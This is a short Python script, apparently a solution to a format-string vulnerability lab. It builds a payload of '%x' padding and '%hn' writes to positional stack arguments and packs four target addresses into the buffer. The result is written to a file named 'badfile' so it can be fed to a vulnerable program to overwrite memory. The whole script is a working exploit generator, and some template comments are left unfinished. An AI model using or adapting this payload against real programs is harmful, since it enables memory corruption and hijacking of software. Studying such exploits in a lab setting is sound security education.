#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

s = '%58864x'+"%134$hn"+'%6671x'+"%135$hn"+'%32768x'+"%136$hn"+'%32769x'+"%137$hn" #54848  52437
fmt  = (s).encode('latin-1')
content[0:0+len(fmt)] = fmt

# This line shows how to store a 4-byte integer at offset 0
start=800
number  = 0x0000555555558010
content[start:start+8]  =  (number).to_bytes(8,byteorder='little')
content[start+8:start+16]  =  (number+2).to_bytes(8,byteorder='little')
content[start+16:start+24]  =  (number+4).to_bytes(8,byteorder='little')
content[start+24:start+32]  =  (number+6).to_bytes(8,byteorder='little')



# This line shows how to construct a string s with


# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
